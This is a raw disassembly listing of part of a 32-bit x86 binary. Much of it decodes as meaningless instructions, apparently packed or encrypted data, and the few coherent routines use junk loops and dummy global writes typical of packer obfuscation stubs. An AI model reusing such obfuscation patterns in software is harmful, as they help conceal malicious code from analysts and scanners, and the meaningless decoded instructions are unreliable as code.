  4059a9:	ins    DWORD PTR es:[edi],dx
  4059aa:	lds    ebp,FWORD PTR [ecx-0x72]
  4059ad:	mov    WORD PTR [edx+0x107ebb54],?
  4059b3:	int    0xae
  4059b5:	and    esi,edx
  4059b7:	mov    dl,0xd
  4059b9:	mov    al,0x8d
  4059bb:	and    DWORD PTR [esi+0x3e],edx
  4059be:	les    esi,FWORD PTR [eax]
  4059c0:	push   ebx
  4059c1:	mov    eax,0x49306e03
  4059c6:	sub    al,0xb
  4059c8:	cli    
  4059c9:	fsub   DWORD PTR [esi-0x3cde73e1]
  4059cf:	ins    BYTE PTR es:[edi],dx
  4059d0:	das    
  4059d1:	test   al,0x36
  4059d3:	outs   dx,DWORD PTR ds:[esi]
  4059d4:	mov    eax,ds:0xfaf46ec1
  4059d9:	and    al,0x57
  4059db:	jnp    0x405990
  4059dd:	sbb    eax,0xeeb1c438
  4059e2:	push   eax
  4059e3:	inc    edi
  4059e4:	adc    al,0xb0
  4059e6:	mov    al,0x3d
  4059e8:	pop    eax
  4059e9:	ds shl ch,1
  4059ec:	sub    cl,al
  4059ee:	mov    WORD PTR [esi-0x7b],ds
  4059f1:	cld    
  4059f2:	leave  
  4059f3:	dec    ecx
  4059f4:	mov    bh,0x4c
  4059f6:	cs push 0xffffff8f
  4059f9:	and    ch,BYTE PTR [ecx+esi*8-0x5d]
  4059fd:	jp     0x405a50
  4059ff:	jae    0x405a07
  405a01:	sbb    BYTE PTR [ebx],ah
  405a03:	dec    ebp
  405a04:	shr    DWORD PTR [ecx+0x6a],cl
  405a07:	pop    es
  405a08:	jg     0x405a18
  405a0a:	jno    0x405a79
  405a0c:	cdq    
  405a0d:	dec    ebx
  405a0e:	and    eax,0x50e69328
  405a13:	jp     0x4059d4
  405a15:	loopne 0x405a2e
  405a17:	or     BYTE PTR [ebx],bh
  405a19:	pop    ds
  405a1a:	mov    ds:0x60164c6b,eax
  405a1f:	cmp    cl,BYTE PTR [edx]
  405a21:	ret    0x85b7
  405a24:	sbb    DWORD PTR [edx-0x115df985],esi
  405a2a:	xchg   ecx,eax
  405a2b:	in     al,dx
  405a2c:	sub    DWORD PTR [esi],ecx
  405a2e:	js     0x405a72
  405a30:	dec    DWORD PTR [ebx]
  405a32:	outs   dx,DWORD PTR ds:[esi]
  405a33:	xchg   dl,dh
  405a35:	mov    edx,0xe0a68596
  405a3a:	loope  0x4059df
  405a3c:	mov    al,0xd0
  405a3e:	cmp    al,0xb
  405a40:	shl    DWORD PTR [esi-0x2bc1d1c4],0xf2
  405a47:	push   ebx
  405a48:	push   edx
  405a49:	cmp    eax,0x5192ebb7
  405a4e:	iret   
  405a4f:	es loope 0x405a53
  405a52:	fwait
  405a53:	pusha  
  405a54:	cmp    BYTE PTR [ecx-0x357b460b],0xb2
  405a5b:	inc    edx
  405a5c:	bound  edx,QWORD PTR [edi-0x5e]
  405a5f:	cmc    
  405a60:	pop    es
  405a61:	mov    al,0xef
  405a63:	jmp    0xb165bb33
  405a68:	inc    edx
  405a69:	retf   
  405a6a:	jns    0x405aab
  405a6c:	pop    edx
  405a6d:	add    dh,bl
  405a6f:	mov    BYTE PTR [esi+0x36d30184],bl
  405a75:	mov    bl,0x4d
  405a77:	cld    
  405a78:	outs   dx,DWORD PTR ds:[esi]
  405a79:	add    esi,DWORD PTR [eax+0x62]
  405a7c:	mov    ebx,0x5430d403
  405a81:	(bad)  
  405a82:	xchg   ecx,eax
  405a83:	cdq    
  405a84:	push   0xffffffef
  405a86:	inc    ebp
  405a87:	(bad)  [eax-0x7d]
  405a8a:	sub    bh,BYTE PTR [ebx+0xf]
  405a8d:	add    bl,BYTE PTR [edx+0x50]
  405a90:	retf   
  405a91:	mov    edi,0x172914a8
  405a96:	xchg   esi,eax
  405a97:	sub    al,0xfa
  405a99:	or     DWORD PTR [edi+0x0],eax
  405a9c:	(bad)  
  405a9d:	fwait
  405a9e:	xchg   edi,eax
  405a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aa0:	xor    BYTE PTR [ecx+esi*1],ah
  405aa3:	jns    0x405a99
  405aa5:	push   es
  405aa6:	pop    esp
  405aa7:	popa   
  405aa8:	dec    ebp
  405aa9:	mov    cl,bl
  405aab:	sub    al,0x64
  405aad:	and    ah,0x7
  405ab0:	xchg   ebp,eax
  405ab1:	and    bh,BYTE PTR [ebx]
  405ab3:	dec    esp
  405ab4:	mov    ch,0x40
  405ab6:	adc    DWORD PTR [eax],ebp
  405ab8:	iret   
  405ab9:	dec    ebp
  405aba:	lds    esi,FWORD PTR [edi+eiz*2-0x1f0e29b9]
  405ac1:	std    
  405ac2:	xchg   edx,eax
  405ac3:	call   0x8150:0xe03130e
  405aca:	mov    esp,0x226de8b2
  405acf:	sbb    eax,0xb9721abf
  405ad4:	test   eax,0xf77264fc
  405ad9:	icebp  
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	xchg   edx,eax
  405da5:	es loop 0x405d6f
  405da8:	mov    esi,DWORD PTR [eax+esi*2]
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405e08
  405db1:	test   eax,0x152fa90a
  405db6:	das    
  405db7:	xor    DWORD PTR [esi],eax
  405db9:	into   
  405dba:	add    al,BYTE PTR [edx+edx*8+0x280f36b9]
  405dc1:	fcomp  QWORD PTR [esi]
  405dc3:	outs   dx,BYTE PTR ds:[esi]
  405dc4:	js     0x405d6c
  405dc6:	cli    
  405dc7:	add    BYTE PTR [edi-0x79],dh
  405dca:	ss push ds
  405dcc:	jg     0x405d93
  405dce:	adc    DWORD PTR [ebx],ebx
  405dd0:	adc    al,0x89
  405dd2:	test   BYTE PTR [ecx],cl
  405dd4:	fstp   DWORD PTR [ebx]
  405dd6:	scas   eax,DWORD PTR es:[edi]
  405dd7:	xchg   ebx,eax
  405dd8:	xchg   ebp,eax
  405dd9:	loope  0x405de9
  405ddb:	add    eax,0x1fff0ab8
  405de1:	jecxz  0x405dac
  405de3:	xor    dl,BYTE PTR [ecx-0x5b]
  405de6:	xchg   ebp,eax
  405de7:	outs   dx,BYTE PTR ds:[esi]
  405de8:	retf   0x4899
  405deb:	pop    ebx
  405dec:	mov    fs,WORD PTR [ecx-0x42d45778]
  405df2:	adc    BYTE PTR [esi+0x20929390],ah
  405df8:	xchg   ebp,eax
  405df9:	retf   
  405dfa:	and    BYTE PTR [edx-0x1cba4c1d],ah
  405e00:	and    BYTE PTR [ecx-0x80],cl
  405e03:	xchg   DWORD PTR [ebx-0x69],eax
  405e06:	out    0x88,al
  405e08:	jnp    0x405e51
  405e0a:	jb     0x405e31
  405e0c:	and    al,0x83
  405e0e:	mov    ebx,ss
  405e10:	pusha  
  405e11:	jp     0x405dda
  405e13:	rcl    BYTE PTR [ebx+0x4b],0xa6
  405e17:	add    DWORD PTR [esi],ebp
  405e19:	icebp  
  405e1a:	pushf  
  405e1b:	mov    cl,BYTE PTR [edi-0x784b1e1f]
  405e21:	jg     0xef907cbe
  405e27:	cmp    eax,0xbd997ad1
  405e2c:	aas    
  405e2d:	jmp    0xfe98:0xc005751e
  405e34:	enter  0x7df8,0x33
  405e38:	test   DWORD PTR [edx+ebx*1+0x79],0x9bd103d9
  405e40:	jle    0x405eb1
  405e42:	or     BYTE PTR [edx+edi*4+0x601ea5a4],ch
  405e49:	inc    eax
  405e4a:	mov    dl,0xb6
  405e4c:	dec    edi
  405e4d:	gs test dl,cl
  405e50:	inc    eax
  405e51:	xlat   BYTE PTR ds:[ebx]
  405e52:	mov    ch,0xe1
  405e54:	jmp    0x82a32ab2
  405e59:	inc    eax
  405e5a:	mov    esp,0x8a2681f
  405e5f:	add    esi,ebp
  405e61:	dec    BYTE PTR [esi+0x55]
  405e64:	sub    BYTE PTR [esi],0x43
  405e67:	xlat   BYTE PTR ds:[ebx]
  405e68:	es iret 
  405e6a:	or     BYTE PTR [esi+0x3b],al
  405e6d:	mov    dl,0x42
  405e6f:	xor    eax,0xb795d8db
  405e74:	fstp   QWORD PTR [ebp-0x149b3c93]
  405e7a:	call   0xfb13:0x54cc6a9f
  405e81:	ror    DWORD PTR [ebx-0x753c77e8],0x90
  405e88:	ins    DWORD PTR es:[edi],dx
  405e89:	(bad)  
  405e8a:	int    0x19
  405e8c:	fdiv   QWORD PTR [edx-0xb]
  405e8f:	lahf   
  405e90:	popa   
  405e91:	xchg   edx,eax
  405e92:	sub    DWORD PTR [edi],0x62
  405e95:	mov    eax,0x1ddce5c5
  405e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e9c:	push   edi
  405e9d:	in     al,dx
  405e9e:	icebp  
  405e9f:	inc    ebp
  405ea0:	sub    DWORD PTR [ebx+0x2b12df02],esp
  405ea6:	test   DWORD PTR [bx+di+0x48],0x95f5bcd0
  405eae:	jge    0x405ea7
  405eb0:	rcl    dl,0x86
  405eb3:	mov    al,ds:0xa248330b
  405eb8:	xchg   esi,eax
  405eb9:	cmp    edi,DWORD PTR [eax+eax*4+0x38]
  405ebd:	inc    ebp
  405ebe:	adc    dl,bh
  405ec0:	push   edx
  405ec1:	retf   
  405ec2:	popa   
  405ec3:	xchg   esp,eax
  405ec4:	dec    edx
  405ec5:	rol    DWORD PTR [ebx+eax*8+0x3a6e68a2],cl
  405ecc:	pop    esi
  405ecd:	enter  0xa5c8,0xb9
  405ed1:	addr16 in eax,dx
  405ed3:	or     eax,0xb299028e
  405ed8:	out    dx,eax
  405ed9:	add    cl,BYTE PTR [edi-0x58]
  405edc:	xor    BYTE PTR [eax-0xf741859],ah
  405ee2:	ss in  al,0x54
  405ee5:	xor    BYTE PTR [eax],al
  405ee7:	mov    es,WORD PTR [edx+0x1b]
  405eea:	arpl   WORD PTR ds:0x62138903,dx
  405ef0:	push   eax
  405ef1:	adc    edi,0x6a195def
  405ef7:	add    al,0xe9
  405ef9:	das    
  405efa:	pop    ecx
  405efb:	sbb    esi,DWORD PTR [ebp-0x3d94ee28]
  405f01:	(bad)  
  405f02:	idiv   BYTE PTR [eax-0x3704cc8d]
  405f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f09:	or     ebp,DWORD PTR ds:0xdeaede20
  405f0f:	mov    al,ds:0x8d037a6
  405f14:	ss pop eax
  405f16:	bound  esp,QWORD PTR [esp+ebp*8+0x43]
  405f1a:	inc    eax
  405f1b:	dec    ebp
  405f1c:	sub    al,0x44
  405f1e:	pop    esi
  405f1f:	nop
  405f20:	lea    ebp,[eax-0x78]
  405f23:	push   edi
  405f24:	jmp    0x405f35
  405f26:	xchg   esi,eax
  405f27:	sub    al,0x41
  405f29:	inc    esi
  405f2a:	sub    eax,0xc24c9a1a
  405f2f:	enter  0x87f7,0x32
  405f33:	test   eax,0xc57895e0
  405f38:	outs   dx,DWORD PTR ds:[esi]
  405f39:	pusha  
  405f3a:	cmp    BYTE PTR [esi-0x46],0xe7
  405f3e:	and    ah,BYTE PTR [esi-0x6ca986e6]
  405f44:	add    eax,0xbe96df48
  405f49:	(bad)  
  405f4a:	sub    BYTE PTR ds:0x65b8202d,cl
  405f50:	sub    BYTE PTR [edx+0x2e],ch
  405f53:	out    0xbe,eax
  405f55:	test   ch,0xa
  405f58:	loope  0x405f87
  405f5a:	in     al,0x6d
  405f5c:	sub    bl,BYTE PTR [ecx+0x5e]
  405f5f:	push   ds
  405f60:	test   eax,0x2f749b28
  405f65:	cmp    bl,BYTE PTR [eax+0x12881960]
  405f6b:	lods   al,BYTE PTR ds:[esi]
  405f6c:	xchg   ebx,eax
  405f6d:	adc    eax,0xf3036d6c
  405f72:	push   cs
  405f73:	dec    edx
  405f74:	cmp    ah,BYTE PTR [bp-0x4b47]
  405f79:	xchg   ecx,eax
  405f7a:	jge    0x405ff3
  405f7c:	mov    al,ds:0x54f3118c
  405f81:	fmul   DWORD PTR [edx-0x483e7863]
  405f87:	cli    
  405f88:	inc    edx
  405f89:	xchg   ebx,eax
  405f8a:	imul   edi,DWORD PTR [edx],0x75
  405f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f8e:	clc    
  405f8f:	out    0xcf,al
  405f91:	or     eax,DWORD PTR [eax+0x5]
  405f94:	or     bl,BYTE PTR [edi+0x1]
  405f97:	cmp    DWORD PTR [edi+0x75],0xffffff97
  405f9b:	jge    0x406004
  405f9d:	call   0x8b40:0x1c54929c
  405fa4:	add    DWORD PTR [eax],eax
  405fa6:	add    eax,0x30cde971
  405fab:	repnz xchg esi,eax
  405fad:	jle    0x405ff4
  405faf:	pushf  
  405fb0:	add    DWORD PTR [ebp+0x2d],edi
  405fb3:	shl    DWORD PTR [eax-0x516859ce],cl
  405fb9:	xchg   ebp,eax
  405fba:	stc    
  405fbb:	lods   eax,DWORD PTR ds:[esi]
  405fbc:	pop    ss
  405fbd:	xchg   BYTE PTR [ebx],ah
  405fbf:	cmp    BYTE PTR [ecx],ah
  405fc1:	aaa    
  405fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc3:	ds ret 0x1841
  405fc7:	(bad)  
  405fc9:	add    eax,0xc2e073dc
  405fce:	dec    ecx
  405fcf:	scas   al,BYTE PTR es:[edi]
  405fd0:	dec    esp
  405fd1:	adc    al,0xb2
  405fd3:	(bad)  
  405fd4:	(bad)  
  405fd5:	cmp    edi,DWORD PTR [edi-0x76]
  405fd8:	lds    ecx,FWORD PTR [eax+esi*1+0x2e81ec00]
  405fdf:	gs xchg ebx,eax
  405fe1:	xor    eax,0xa41f4076
  405fe6:	mov    edi,0x4dd5374f
  405feb:	cs jle 0x405f9e
  405fee:	adc    eax,0x225c7902
  405ff3:	out    0xd5,eax
  405ff5:	lea    eax,[ebx]
  405ff7:	inc    ebx
  405ff8:	pushf  
  405ff9:	add    esi,DWORD PTR [ecx]
  405ffb:	aaa    
  405ffc:	inc    edx
  405ffd:	imul   eax,DWORD PTR [ebp+0x2e],0x23
  406001:	inc    eax
  406002:	pop    ss
  406003:	mov    eax,ds:0x6ba68cef
  406008:	push   eax
  406009:	test   al,0x23
  40600b:	cmp    ebx,DWORD PTR [ecx+0x1a780a11]
  406011:	inc    ecx
  406012:	scas   eax,DWORD PTR es:[edi]
  406013:	adc    eax,0x1e736266
  406018:	dec    eax
  406019:	(bad)  
  40601a:	xor    al,ch
  40601c:	mov    eax,0x1e819312
  406021:	adc    ebx,DWORD PTR [edx]
  406023:	sbb    edi,DWORD PTR [edi-0x26]
  406026:	inc    esi
  406027:	push   ds
  406028:	and    BYTE PTR [edx+eiz*1],bl
  40602b:	shl    ebx,0xd6
  40602e:	arpl   WORD PTR [ebp-0x22],bp
  406031:	cli    
  406032:	mov    dl,0x98
  406034:	jl     0x405fc9
  406036:	lods   al,BYTE PTR ds:[esi]
  406037:	adc    ebx,0x3f1fac01
  40603d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40603f:	hlt    
  406040:	mov    ah,0x81
  406042:	inc    ebp
  406043:	inc    ebp
  406044:	leave  
  406045:	shr    BYTE PTR [ecx+ebp*4],1
  406048:	mov    ds:0x649a9759,eax
  40604d:	div    cl
  40604f:	out    dx,eax
  406050:	cdq    
  406051:	pop    ecx
  406052:	mov    WORD PTR [ebx-0x1681ed3e],?
  406058:	sub    BYTE PTR [ecx],bl
  40605a:	retf   0xe547
  40605d:	scas   al,BYTE PTR es:[edi]
  40605e:	jo     0x4060bd
  406060:	and    esi,ebp
  406062:	xlat   BYTE PTR ds:[ebx]
  406063:	retf   
  406064:	mov    dh,0x24
  406066:	add    bh,dh
  406068:	ror    DWORD PTR cs:[edx],0x4b
  40606c:	fimul  WORD PTR ds:0xaeab4467
  406072:	push   cs
  406073:	sti    
  406074:	sub    ebp,DWORD PTR [edi+edx*4-0x6296b24b]
  40607b:	out    0xd4,al
  40607d:	out    0x11,al
  40607f:	dec    eax
  406080:	push   esi
  406081:	repnz setg BYTE PTR [edi]
  406085:	mov    edi,ebx
  406087:	xlat   BYTE PTR ds:[ebx]
  406089:	mov    BYTE PTR [edx+edx*8-0x3],dl
  40608d:	clc    
  40608e:	sbb    DWORD PTR [ebp-0x40b56b1f],ebx
  406094:	out    dx,al
  406095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406096:	add    BYTE PTR [bx+di],0x43
  40609a:	or     BYTE PTR [eax-0x28],ah
  40609d:	dec    ebp
  40609e:	push   ds
  40609f:	mov    cl,0x23
  4060a1:	arpl   WORD PTR [eax-0xa],sp
  4060a4:	sub    cl,bh
  4060a6:	scas   eax,DWORD PTR es:[edi]
  4060a7:	pop    es
  4060a8:	or     ebp,DWORD PTR [edi]
  4060aa:	inc    eax
  4060ab:	scas   al,BYTE PTR es:[edi]
  4060ac:	mov    esp,0x86c18fca
  4060b1:	mov    esp,0x4281604e
  4060b6:	sub    ebp,DWORD PTR ds:0x8b116bf4
  4060bc:	repz push edi
  4060be:	xchg   ebx,eax
  4060bf:	mov    bl,0xc
  4060c1:	jb     0x406077
  4060c3:	adc    ch,dl
  4060c5:	pop    ecx
  4060c6:	or     BYTE PTR [ecx-0x48fd099f],ah
  4060cc:	xor    ax,0xe96a
  4060d0:	pop    ds
  4060d1:	bound  ecx,QWORD PTR [edi-0x73]
  4060d4:	mov    ah,0x86
  4060d6:	loope  0x406075
  4060d8:	mov    al,ds:0x59862d0d
  4060dd:	add    eax,0xc633d1b5
  4060e2:	add    DWORD PTR ds:0x432dbe,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43441d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	and    al,0xe6
  40610c:	push   es
  40610d:	cmp    al,0xbb
  40610f:	xor    DWORD PTR [eax+0x70],esi
  406112:	and    BYTE PTR [ebp+0x70],bh
  406115:	jo     0x406133
  406117:	jns    0x406137
  406119:	sub    BYTE PTR [eax+edx*2],dl
  40611c:	cmp    ah,dh
  40611e:	cmp    BYTE PTR [ecx-0x1a651834],bh
  406124:	mov    ch,0x3c
  406126:	in     al,0xe1
  406128:	xchg   ecx,eax
  406129:	inc    eax
  40612a:	xor    al,bh
  40612c:	mov    edx,0xbdaac71e
  406131:	jmp    0xb334bc8a
  406136:	pop    dx
  406138:	es xchg esi,eax
  40613a:	cmp    BYTE PTR [edi],cl
  40613c:	mov    gs,ebx
  40613e:	data16 (bad) 
  406140:	fcom   QWORD PTR [edx-0x17]
  406143:	ror    eax,0x8a
  406146:	ja     0x406197
  406148:	mov    al,0x74
  40614a:	ret    
  40614b:	lock sahf 
  40614d:	enter  0x8f47,0x4e
  406151:	mov    ebp,DWORD PTR [edi+0x524246ce]
  406157:	leave  
  406158:	inc    edx
  406159:	cmp    esi,DWORD PTR [edi+0x29]
  40615c:	xchg   ebp,eax
  40615d:	fsubr  QWORD PTR [ebp+0x7c]
  406160:	int3   
  406161:	mov    ecx,0xdd762454
  406166:	retf   0x9bfc
  406169:	cs fs jle 0x4060f5
  40616d:	mov    bh,0x4c
  40616f:	push   ecx
  406170:	nop
  406171:	(bad)  
  406172:	mov    edx,0x782be2c5
  406177:	or     ecx,DWORD PTR [ebx+0x48f4f2bd]
  40617d:	dec    edi
  40617e:	ss dec edi
  406180:	mov    al,ds:0xaf9a0eae
  406185:	ret    0x33a7
  406188:	sub    bh,ch
  40618a:	mov    ecx,0x612fc6c8
  40618f:	(bad)  
  406190:	lahf   
  406191:	inc    edx
  406192:	xor    edx,DWORD PTR [edx+0x30cc8a68]
  406198:	call   0x72cd:0x425c0676
  40619f:	fptan  
  4061a1:	(bad)  
  4061a2:	cmp    ah,ah
  4061a4:	mov    edx,0x6ef3c2bf
  4061a9:	cmp    ch,dh
  4061ab:	cmc    
  4061ac:	xchg   esi,eax
  4061ad:	mov    cl,0xd6
  4061af:	or     eax,0xf73dfe19
  4061b4:	jecxz  0x40617f
  4061b6:	mov    bh,0xd2
  4061b8:	jg     0x40619e
  4061ba:	mov    bl,0xb9
  4061bc:	pop    edx
  4061bd:	cld    
  4061be:	fwait
  4061bf:	pop    ecx
  4061c0:	fistp  WORD PTR [ecx+0x28]
  4061c3:	push   ebx
  4061c4:	scas   eax,DWORD PTR es:[di]
  4061c6:	dec    edx
  4061c7:	push   ebp
  4061c8:	addr16 push eax
  4061ca:	cmc    
  4061cb:	mov    al,ds:0x98df470a
  4061d0:	div    DWORD PTR [esi]
  4061d2:	imul   ebx,DWORD PTR [esi-0xa],0x3ec68c80
  4061d9:	je     0x4061cb
  4061db:	fld    TBYTE PTR [eax+esi*1-0x5a]
  4061df:	je     0x406239
  4061e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061e2:	lahf   
  4061e3:	xor    eax,0x896f6d5f
  4061e8:	pushf  
  4061e9:	sar    BYTE PTR [esi+0x3222b4a2],1
  4061ef:	and    al,BYTE PTR [ecx+0xd391f2e]
  4061f5:	aaa    
  4061f6:	xchg   edi,eax
  4061f7:	mov    dl,0x71
  4061f9:	pop    esp
  4061fa:	pop    ds
  4061fb:	xchg   ebp,eax
  4061fc:	push   ss
  4061fd:	fld    DWORD PTR [eax+0x6193a8d8]
  406203:	mov    ecx,0xf941defe
  406208:	ins    DWORD PTR es:[edi],dx
  406209:	inc    ebp
  40620a:	arpl   WORD PTR fs:[edx],sp
  40620d:	enter  0xa838,0x2e
  406211:	leave  
  406212:	into   
  406213:	sar    BYTE PTR [esi-0x76],cl
  406216:	call   0x37acfdb6
  40621b:	(bad)  
  40621c:	pusha  
  40621d:	loop   0x406243
  40621f:	dec    edx
  406220:	sub    al,0xbd
  406222:	leave  
  406223:	sbb    al,0xa8
  406225:	test   eax,0xa74b7ca1
  40622a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40622b:	mov    ah,0xcd
  40622d:	sbb    al,BYTE PTR [ecx]
  40622f:	or     edi,ecx
  406231:	push   esi
  406232:	(bad)  
  406233:	and    DWORD PTR [ecx-0x2b46c1c5],eax
  406239:	mov    bl,0xa9
  40623b:	push   ss
  40623c:	jmp    0xf1833d29
  406241:	dec    esp
  406242:	push   ds
  406243:	fdiv   st,st(1)
  406245:	add    eax,0xcfd07abe
  40624a:	scas   eax,DWORD PTR es:[edi]
  40624b:	adc    ch,ch
  40624d:	sub    ah,BYTE PTR [ecx+eax*4-0x57]
  406251:	dec    edx
  406252:	(bad)  
  406253:	jmp    0x4061fc
  406255:	mov    esp,DWORD PTR [ebx-0x2f]
  406258:	xchg   DWORD PTR [edx],esi
  40625a:	into   
  40625b:	mov    bl,0x6a
  40625d:	pusha  
  40625e:	ror    DWORD PTR [esi+0x5f006ec9],1
  406264:	(bad)  
  406265:	popf   
  406266:	push   es
  406267:	or     ecx,DWORD PTR [eax-0x666283e7]
  40626d:	retf   0x5541
  406270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406271:	add    al,0x21
  406273:	pop    edx
  406274:	jbe    0x406225
  406276:	mov    al,0xe0
  406278:	mov    dl,0x77
  40627a:	loop   0x4062eb
  40627c:	js     0x4062b3
  40627e:	and    eax,0x6562ad07
